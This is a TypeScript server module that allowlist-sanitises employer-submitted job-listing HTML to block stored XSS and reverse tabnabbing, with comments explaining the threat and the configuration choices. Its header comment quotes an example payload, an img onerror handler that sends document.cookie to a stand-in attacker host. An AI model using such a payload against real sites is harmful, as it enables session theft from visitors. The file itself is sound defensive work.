import "server-only";
import sanitizeHtml from "sanitize-html";

/**
 * Sanitises job description / requirements / benefits before they are rendered
 * with dangerouslySetInnerHTML.
 *
 * WHY THIS IS NEEDED NOW
 * Job body copy is rendered as raw HTML in components/job-detail.tsx. That was
 * defensible while only PAC staff wrote listings. Employers can now self-serve,
 * which turns it into stored XSS: an employer submits a description containing
 * `<img src=x onerror="fetch('https://attacker/'+document.cookie)">`, an admin
 * approves the listing without reading the markup, and the payload then runs for
 * every visitor to a public page — including admins and employers browsing while
 * signed in. Supabase keeps its session in a cookie readable by JS, so that is a
 * session-theft path, not just defacement.
 *
 * Sanitising on READ rather than on write, deliberately: it also covers the
 * 4,355 descriptions already migrated out of WordPress, and anything inserted
 * directly through PostgREST with the public anon key, neither of which passes
 * through the write path.
 *
 * ALLOWLIST, not a blocklist. Job copy needs paragraphs, lists, emphasis,
 * headings and links — nothing more. No script, no style, no iframe, no event
 * handlers, and no attributes beyond href on a link.
 */
const OPTIONS: sanitizeHtml.IOptions = {
  allowedTags: [
    // `div` is allowed only so it can be rewritten to `p` below. Some browsers
    // still emit a div per line from contenteditable regardless of
    // defaultParagraphSeparator, and dropping the tag would keep the text while
    // silently losing the line break — the exact format loss this is meant to
    // prevent.
    "p", "div", "br", "hr",
    "strong", "b", "em", "i", "u", "s",
    "ul", "ol", "li",
    "h2", "h3", "h4",
    "blockquote",
    "a",
    "table", "thead", "tbody", "tr", "th", "td",
  ],
  allowedAttributes: {
    // `rel` and `target` have to be listed here even though the transform below
    // is what sets them: sanitize-html runs transformTags FIRST and then filters
    // attributes against this list, so without them the transform's own output
    // was being stripped straight back off. Every external link in job copy has
    // therefore been rendering without noopener since this file was written —
    // a reverse-tabnabbing path that the comment below claimed was closed.
    a: ["href", "title", "rel", "target"],
  },
  // No style attribute anywhere, which is what strips the `mso-*` and font
  // wrappers a paste from Word carries. `span` and `font` are absent from the
  // allowlist entirely, so their text survives and their styling does not.
  allowedSchemes: ["http", "https", "mailto", "tel"],
  allowedSchemesAppliedToAttributes: ["href"],
  transformTags: {
    // A block is a block. Nested divs become nested `p`, which the browser's
    // parser auto-closes into siblings — the right result either way.
    div: "p",
    // Untrusted links leave the site, so do not hand over window.opener.
    a: (tagName, attribs) => ({
      tagName,
      attribs: { ...attribs, rel: "nofollow noopener noreferrer", target: "_blank" },
    }),
  },
  // Drop the contents of anything removed, rather than leaving inline JS as text.
  nonTextTags: ["style", "script", "textarea", "option", "noscript", "iframe"],
};

export function sanitizeJobHtml(html: string | null | undefined): string {
  if (!html) return "";
  return sanitizeHtml(html, OPTIONS);
}
